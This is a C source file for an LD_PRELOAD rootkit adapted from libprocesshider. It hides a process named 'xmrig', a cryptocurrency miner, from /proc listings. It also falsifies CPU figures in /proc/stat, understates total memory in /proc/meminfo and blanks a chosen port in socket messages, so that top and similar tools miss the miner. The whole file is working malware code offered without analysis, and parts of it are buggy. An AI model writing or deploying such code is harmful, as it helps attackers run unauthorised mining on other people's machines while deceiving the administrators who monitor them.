/**
 * Based on:
 * - https://github.com/gianlucaborello/libprocesshider
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>

/*
 * Every process with this name will be excluded
 */
static const char *process_to_filter = "xmrig";

/**
 * Port to hide
 */
// static const int port_to_hide = 55271;
static const int port_to_hide = 45552;

static int (*old_openat)(int dirfd, const char *pathname, int flags) = NULL;
static ssize_t (*old_recvmsg)(int sockfd, struct msghdr *msg, int flags) = NULL;
FILE *(*old_fopen)(const char *path, const char *mode) = NULL;
FILE *(*old_fopen64)(const char *path, const char *mode) = NULL;
size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
size_t (*old_fread64)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
static char *(*old_fgets)(char *s, int size, FILE *stream) = NULL;

// Read system call
static ssize_t (*old_read)(int fd, void *buf, size_t count) = NULL;

/**************
 * HELPERS
 * ************/

/*
 * Get a path name given a FILE* handle
 */
static int get_path_file(FILE *file, char *buf, size_t size)
{
    int fd = fileno(file);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1)
    {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/**************
 * PRELOAD
 ***************/

// Read system call
ssize_t read(int fd, void *buf, size_t count)
{
    if (old_read == NULL)
    {
        old_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t ret = old_read(fd, buf, count);

    // printf("read called with fd %d\n", fd);

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);

    char path[PATH_MAX];
    ssize_t len = readlink(tmp, path, sizeof(path) - 1);

    if (len == -1)
    {
        return 0;
    }

    // IMPORTANT: readlink does not add the null character
    path[len] = 0;

    // printf("fread() called, fd: %d, path: %s \n", fd, path);

    // printf("path: %s, count: %d, ret: %d\n", path, count, ret);

    // Compare path /proc/stat for cpu usage
    // printf("path: %s\n", path);

    if (strcmp(path, "/proc/stat") == 0)
    {
        // Change first line of /proc/stat
        char *line = strstr(buf, "cpu ");

        // prinf("proc::stat -> line: %s\n", line);
    }

    // Compare path /proc/meminfo
    if (strcmp(path, "/proc/meminfo") == 0)
    {
        char line[1024];

        char *new_buf = malloc(count);

        // Set new buffer to 0
        memset(new_buf, 0, count);

        // Read buffer line by line using strchr
        char *start = buf;
        char *end;

        while (start != NULL)
        {
            // printf("[debug] start: %s\n", start);

            end = strchr(start, '\n');
            // printf("[debug] end: %s\n", end);
            if (end != NULL)
            {
                *end = '\0';
            }

            // If line starts with MemTotal, MemFree, MemAvailable, change values
            if (strstr(start, "MemTotal:") == start)
            {
                // Read total memory from system with sysconf
                long pages = sysconf(_SC_PHYS_PAGES);
                long page_size = sysconf(_SC_PAGE_SIZE);
                long total_memory = (pages * page_size) * 0.6;

                sprintf(line, "MemTotal:     %ld kB\n", total_memory / 1024);
            }
            else
            {
                sprintf(line, "%s\n", start);
            }

            // String copy and add newline
            // printf("[debug] line: %s\n", line);

            // Copy line to new buffer
            // strncat(line, new_buf, sizeof(new_buf) - strlen(new_buf) - 1);
            strcat(new_buf, line);

            start = (end != NULL) ? end + 1 : NULL;
        }

        // Copy new buffer to original buffer
        memcpy(buf, new_buf, count);

        // Free the new buffer
        free(new_buf);
    }
    return ret;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags)
{
    // printf("recvmsg() called\n");

    // Debug messages
    if (old_recvmsg == NULL)
    {
        old_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
    }

    ssize_t ret = old_recvmsg(sockfd, msg, flags);
    if (ret == -1)
    {
        return ret;
    }

    // Array iov
    struct iovec *iov = msg->msg_iov;

    // IOV vector to buffer
    unsigned char *buffer = (unsigned char *)malloc(iov->iov_len);
    size_t buffer_size = iov->iov_len;

    if (buffer == NULL)
    {
        return ret;
    };

    memcpy(buffer, iov->iov_base, buffer_size);

    // Print as hexadecimal each byte as hexdump
    for (int i = 0; i < buffer_size; i++)
    {
        if (((buffer[i]) == (port_to_hide >> 8) & 0xFF) &&
            buffer[i + 1] == (port_to_hide & 0xFF))
        {
            // Hide port
            buffer[i] = 0x00;
            buffer[i + 1] = 0x00;
        }
    };

    // Copy back to iov
    memcpy(iov->iov_base, buffer, buffer_size);
    free(buffer);

    return ret;
}

int openat(int dirfd, const char *pathname, int flags)
{
    // printf("openat() called\n");

    // Debug messages
    if (old_openat == NULL)
    {
        old_openat = dlsym(RTLD_NEXT, "openat");
    }

    return old_openat(dirfd, pathname, flags);
}

FILE *fopen(const char *path, const char *mode)
{
    if (old_fopen == NULL)
    {
        old_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    FILE *ret = old_fopen(path, mode);

    const char *mem = "/proc/meminfo";
    if (strcmp(path, mem) == 0)
    {
        return ret;
        // printf("fopen() called on /proc/meminfo\n");
        // return NULL;
    }

    // printf("fopen() called on %s\n", path);
    return ret;
}

FILE *fopen64(const char *path, const char *mode)
{
    if (old_fopen64 == NULL)
    {
        old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    }

    FILE *ret = old_fopen64(path, mode);

    // Files to exclude from hiding
    const char *tcp = "/proc/net/tcp";
    const char *tcp6 = "/proc/net/tcp6";
    const char *udp = "/proc/net/udp";
    const char *udp6 = "/proc/net/udp6";
    const char *mem = "/proc/meminfo";

    // if (strcmp(path, tcp) == 0 || strcmp(path, tcp6) == 0 || strcmp(path, udp) == 0 || strcmp(path, udp6) == 0)
    // {
    //     return NULL;
    // }
    if (strcmp(path, mem) == 0)
    {
        // printf("fopen64() called on /proc/meminfo\n");
        return ret;
        // return NULL;
    }
    // printf("fopen64() called on %s\n", path);

    return ret;
}

/**
 * Used by top command for cpu usage
 */
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    if (old_fread == NULL)
    {
        old_fread = dlsym(RTLD_NEXT, "fread");
    }

    // Debug information
    size_t ret = old_fread(ptr, size, nmemb, stream);

    int fd = fileno(stream);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);

    char path[PATH_MAX];
    ssize_t len = readlink(tmp, path, sizeof(path) - 1);

    if (len == -1)
    {
        return 0;
    }

    // Use string starting as I could not get to match exact path
    // There seems to be some non printable characters in the final
    // part of the path
    if (strstr(path, "/proc/stat") == path)
    {
        char *line;

        // Copy buffer to new buffer
        char *new_buf = (char *)malloc(ret + 1);

        if (new_buf == NULL)
        {
            return ret;
        }

        memcpy(new_buf, ptr, ret);

        line = strtok(new_buf, "\n");

        while (line != NULL)
        {
            // Check first line of buffer starts with "cpu "
            // Check string starts with "cpu "
            // if (strcmp(line, "cpu ") == 0)
            if (strncmp(line, "cpu ", 4) == 0)
            {
                // printf("cpu line found\n");

                // Scanf the values
                int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;
                int result = sscanf(ptr, "cpu  %d %d %d %d %d %d %d %d %d %d", &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);

                if (!result)
                {
                    printf("sscanf() failed\n");
                    exit(1);
                }

                // Take only the 25% of user time and sum it to the idle time
                int new_idle = idle + (user * 0.75);
                int new_user = user * 0.25;

                // Write back to buffer
                // Create new buffer with first line modifed and rest of the buffer
                // copied as is
                char *new_buf = (char *)malloc(ret);
                if (new_buf == NULL)
                {
                    printf("malloc() failed\n");
                    exit(1);
                }

                // Create new line
                char new_line[256];
                snprintf(new_line, sizeof(new_line), "cpu  %d %d %d %d %d %d %d %d %d %d", new_user, nice, system, new_idle, iowait, irq, softirq, steal, guest, guest_nice);

                // Copy new line to buffer
                memcpy(new_buf, new_line, strlen(new_line));

                // Copy rest of the buffer
                memcpy(new_buf + strlen(new_line), ptr + strlen(new_line), ret - strlen(new_line));

                // Copy back to original buffer
                memcpy(ptr, new_buf, ret);

                free(new_buf);

                return ret;
            }
            line = strtok(NULL, "\n");
        }
        free(new_buf);
    }

    // printf("fread() called, fd: %d, path: %s \n", fd, path);

    return ret;
}

size_t fread64(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    if (old_fread64 == NULL)
    {
        old_fread64 = dlsym(RTLD_NEXT, "fread64");
    }

    // Debug information
    size_t ret = old_fread64(ptr, size, nmemb, stream);

    int fd = fileno(stream);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);

    char path[PATH_MAX];
    ssize_t len = readlink(tmp, path, sizeof(path) - 1);

    if (len == -1)
    {
        return 0;
    }

    printf("fread64() called, fd: %d, path: %s \n", fd, path);
    return ret;
}

char *fgets(char *s, int size, FILE *stream)
{
    if (old_fgets == NULL)
    {
        old_fgets = dlsym(RTLD_NEXT, "fgets");
    }

    // Debug information
    char *ret = old_fgets(s, size, stream);

    // Get file descriptor
    int fd = fileno(stream);

    // Get file path
    // Get the real path name of the file
    struct stat inode;
    fstat(fd, &inode);

    // Get the path of the file
    char path[PATH_MAX];
    char proc[PATH_MAX];

    sprintf(proc, "/proc/self/fd/%d", fd);

    // Get the real path
    ssize_t len = readlink(proc, path, sizeof(path) - 1);

    if (len != -1)
    {
        path[len] = '\0';
    }

    // printf("fgets() called -> path: %s\n", path);
    // printf("---> %s\n", s);

    // Check we are reading the /proc/stat file
    // The same as before, we check the first part of the path
    // as there seems to be some non printable characters at the end
    if (strstr(path, "/proc/stat") == path)
    {
        // Check if we are reading line starting with
        // - cpu
        // - cpuX where X is a number

        // Check first line of buffer starts with "cpu "
        if (strstr(s, "cpu ") == s)
        {
            // Scanf the values
            int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;
            sscanf(s, "cpu %d %d %d %d %d %d %d %d %d %d", &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);

            // Take only the 25% of user time and sum it to the idle time
            int new_idle = idle + (user * 0.75);
            int new_user = user * 0.25;

            // Create new line
            char new_line[256];
            snprintf(new_line, sizeof(new_line), "cpu %d %d %d %d %d %d %d %d %d %d", new_user, nice, system, new_idle, iowait, irq, softirq, steal, guest, guest_nice);

            // Copy new line to buffer
            memcpy(s, new_line, strlen(new_line));
        }

        // Check if starts with "cpuX " where X is a number
        int cpu_num;
        if (sscanf(s, "cpu%d", &cpu_num) == 1)
        {
            // printf("DEBUG:::: CPU number: %d\n", cpu_num);
            int user, nice, system, idle, iowait, irq, softirq, steal, guest, guest_nice;

            sscanf(s, "cpu%d %d %d %d %d %d %d %d %d %d", &cpu_num, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal, &guest, &guest_nice);

            // Take only the 25% of user time and sum it to the idle time
            int new_idle = idle + (user * 0.75);
            int new_user = user * 0.25;

            // Create new line
            char new_line[256];
            snprintf(new_line, sizeof(new_line), "cpu%d %d %d %d %d %d %d %d %d %d %d", cpu_num, new_user, nice, system, new_idle, iowait, irq, softirq, steal, guest, guest_nice);

            // Copy new line to buffer
            memcpy(s, new_line, strlen(new_line));
        }

        return ret;
    }
}

// From:
// - https://github.com/gianlucaborello/libprocesshider
/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR *dirp, char *buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1)
    {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char *pid, char *buf)
{
    if (strspn(pid, "0123456789") != strlen(pid))
    {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE *f = fopen(tmp, "r");
    if (f == NULL)
    {
        return 0;
    }

    if (fgets(tmp, sizeof(tmp), f) == NULL)
    {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                              \
    static struct dirent *(*original_##readdir)(DIR *) = NULL;        \
                                                                      \
    struct dirent *readdir(DIR *dirp)                                 \
    {                                                                 \
        if (original_##readdir == NULL)                               \
        {                                                             \
            original_##readdir = dlsym(RTLD_NEXT, #readdir);          \
            if (original_##readdir == NULL)                           \
            {                                                         \
                fprintf(stderr, "Error in dlsym: %s\n", dlerror());   \
            }                                                         \
        }                                                             \
                                                                      \
        struct dirent *dir;                                           \
                                                                      \
        while (1)                                                     \
        {                                                             \
            dir = original_##readdir(dirp);                           \
            if (dir)                                                  \
            {                                                         \
                char dir_name[256];                                   \
                char process_name[256];                               \
                if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                    strcmp(dir_name, "/proc") == 0 &&                 \
                    get_process_name(dir->d_name, process_name) &&    \
                    strcmp(process_name, process_to_filter) == 0)     \
                {                                                     \
                    continue;                                         \
                }                                                     \
            }                                                         \
            break;                                                    \
        }                                                             \
        return dir;                                                   \
    }

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);